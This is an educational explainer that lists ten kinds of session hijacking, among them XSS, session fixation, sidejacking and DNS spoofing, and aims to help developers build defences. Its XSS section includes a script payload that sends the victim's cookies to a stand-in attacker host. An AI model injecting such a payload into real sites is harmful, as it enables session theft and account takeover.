# Types of Session Hijacking

Session hijacking can be classified based on the methods used to steal or exploit session identifiers (Session IDs). Below are the main types of session hijacking attacks, along with explanations and examples.

---

## **1. Active Session Hijacking**

In active session hijacking, the attacker takes control of an ongoing user session by actively intercepting and altering data between the user and the server.  

### **Techniques**  
- **Man-in-the-Middle (MITM) Attack**  
  - The attacker intercepts communication between the client and server, capturing or altering data in real-time.  
  - Example: Intercepting unencrypted traffic on a public Wi-Fi network.

- **Man-in-the-Browser (MITB) Attack**  
  - A malicious program installed in the user’s browser captures or modifies session-related data before it reaches the server.  

---

## **2. Passive Session Hijacking**

In passive session hijacking, the attacker monitors the user’s session without directly interfering with the communication.  

### **Techniques**  
- **Session Sniffing**  
  - Capturing unencrypted network traffic to extract session information, such as Session IDs.  
  - Tools: Wireshark, tcpdump.

- **Monitoring Cookies**  
  - Stealing cookies stored on the client’s device to extract session credentials.

---

## **3. Cross-Site Scripting (XSS)**

Attackers inject malicious scripts into a web application to steal Session IDs from cookies or other storage mechanisms.

### **Example**  
- The attacker embeds a script in a comment section:  
  ```javascript
  <script>
    document.write('<img src="http://malicious-site.com/cookie?value=' + document.cookie + '">');
  </script>

## **4. Session Fixation**
In session fixation attacks, the attacker forces a user to use a known Session ID. Once the user logs in, the attacker hijacks the session by using the same Session ID.

### Example Process
Attacker sends a link with a pre-set Session ID to the victim:
http://example.com?sessionid=attacker123
The user logs in, and the server associates the Session ID with the victim.
The attacker reuses the Session ID to gain unauthorized access.

## **5. Sidejacking (Session Sidejacking)**
Sidejacking involves capturing session data, such as cookies, transmitted over an insecure network.

### Example
On public Wi-Fi, the attacker uses tools like Firesheep to intercept unencrypted cookies and impersonate the user.

## **6. Replay Attack**
In a replay attack, the attacker captures and reuses session data or credentials to mimic the user.

### Example
The attacker intercepts a login token and reuses it to authenticate with the server.

## **7. Cookie Theft**
Attackers steal session cookies, which contain Session IDs, to hijack the session.

Methods
Using XSS to steal cookies.
Physically accessing a device to copy stored cookies.
Malware that extracts cookies from the browser.

## **8. Social Engineering**
In social engineering-based hijacking, the attacker tricks the victim into revealing session-related information.

### Example
Phishing emails that request the user to log into a fake website, allowing the attacker to capture the Session ID.

## **9. DNS Spoofing**
The attacker redirects the victim’s traffic to a malicious server by altering DNS responses. This allows the attacker to steal or manipulate session data.

### Example
Redirecting a user from example.com to a fake website with a similar appearance and capturing the Session ID.

## **10. Token Hijacking**
Some web applications use tokens for session management. In token hijacking, the attacker steals these tokens to gain access.

### Example
Stealing OAuth tokens or JWTs (JSON Web Tokens) to impersonate the user.

## Conclusion
Session hijacking can occur through various methods, exploiting weaknesses in session management, communication protocols, and user behavior. By understanding these types, developers and security professionals can implement targeted defenses to mitigate such attacks.